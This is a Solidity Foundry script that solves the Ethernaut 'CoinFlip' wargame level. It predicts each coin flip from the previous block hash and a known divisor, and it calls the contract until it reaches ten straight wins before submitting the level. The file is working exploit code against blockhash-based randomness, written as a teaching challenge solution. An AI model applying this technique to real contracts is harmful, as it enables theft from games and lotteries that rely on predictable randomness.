// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {CoinFlip} from "src/03/CoinFlip.sol";
import {CoinFlipFactory} from "src/03/CoinFlipFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console} from "forge-std/Test.sol";
import {SafeMath} from "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";

contract CoinFlipExploit is Script {
    using SafeMath for uint256;

    address public levelFactory;
    HelperConfig public config;
    address payable instance;
    address ethernaut;
    uint256 deployerKey;

    function run() external {
        console.log("Deploying new instance");
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL3_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new CoinFlipFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (ethernaut, instance, deployerKey) = config.activeNetworkConfig();
        string memory instanceString = Strings.toHexString(uint256(uint160(address(instance))), 20);
        console.log(instanceString);

        vm.startBroadcast(deployerKey);

        // Break the contract
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint8 WINS_TO_COMPLETE_LEVEL = 10;
        uint256 blockValue;
        bool side;
        uint256 coinFlip;
        uint256 lastHash;

        do {
            blockValue = uint256(blockhash(block.number.sub(1)));
            if (lastHash == blockValue) {
                console.log(CoinFlip(instance).consecutiveWins());
                return;
            }
            coinFlip = blockValue.div(FACTOR);
            side = coinFlip == 1 ? true : false;
            CoinFlip(instance).flip(side);
            lastHash = blockValue;
        } while (CoinFlip(instance).consecutiveWins() < WINS_TO_COMPLETE_LEVEL);

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
